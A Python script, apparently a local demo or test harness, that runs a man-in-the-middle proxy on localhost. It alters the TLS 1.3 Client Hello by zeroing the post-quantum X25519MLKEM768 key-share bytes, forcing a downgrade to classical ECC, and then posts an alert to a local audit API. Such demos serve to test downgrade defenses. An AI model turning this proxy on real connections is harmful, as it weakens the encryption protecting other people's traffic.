import socket
import sys
import threading
import requests

if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

LISTEN_PORT = 6500
TARGET_PORT = 6000

def tamper_and_strip_pqc(data):
    if len(data) > 6 and data[0] == 0x16 and data[5] == 0x01:
        print("\n" + "="*65)
        print("[!] [MITM PROXY] Bắt được gói tin TLS 1.3 Client Hello trên đường truyền!")
        
        if b'\x11\xec' in data:
            print("[!] [ATTACK] Phát hiện Extension PQC (X25519MLKEM768, 1216 bytes)!")
            print("[!] [DOWNGRADE] Đang cắt bỏ thành phần PQC để ép hạ cấp về Classical ECC...")
            tampered = data.replace(b'\x11\xec', b'\x00\x00')
            print("[+] Đã cắt bỏ PQC thành công! Đang chuyển tiếp gói tin lỗi vào Server...")
            print("="*65 + "\n")
            
            # Gửi cảnh báo CRITICAL trực tiếp vào hộp đen Audit của Node 1 qua HTTP API
            try:
                requests.post("http://127.0.0.1:5000/api/audit/alert", json={
                    "category": "P2P",
                    "title": "CANH BAO AN NINH: P2P TLS Downgrade Attack Detected!",
                    "details": {
                        "attacker": "127.0.0.1:6500",
                        "stripped_extension": "X25519MLKEM768 (0x11ec)",
                        "defense": "ZERO_TRUST_ENFORCED",
                        "action": "DROP_CONNECTION"
                    },
                    "status": "CRITICAL"
                }, timeout=1)
            except Exception:
                pass
            return tampered
    return data

def handle_conn(client_sock):
    target_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        target_sock.connect(("127.0.0.1", TARGET_PORT))
    except Exception as e:
        client_sock.close()
        return

    first_pkt = True
    try:
        while True:
            data = client_sock.recv(4096)
            if not data:
                break
            if first_pkt:
                data = tamper_and_strip_pqc(data)
                first_pkt = False
            target_sock.sendall(data)
    except Exception:
        pass
    finally:
        client_sock.close()
        target_sock.close()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("127.0.0.1", LISTEN_PORT))
    s.listen(5)
    print("=" * 65)
    print(f"[*] MITM Proxy đang lắng nghe tại cổng {LISTEN_PORT} -> Chuyển tiếp tới {TARGET_PORT}")
    print("[*] Sẵn sàng đánh chặn gói tin bắt tay PQC...")
    print("=" * 65)
    try:
        while True:
            c, _ = s.accept()
            threading.Thread(target=handle_conn, args=(c,), daemon=True).start()
    except KeyboardInterrupt:
        s.close()

if __name__ == '__main__':
    main()
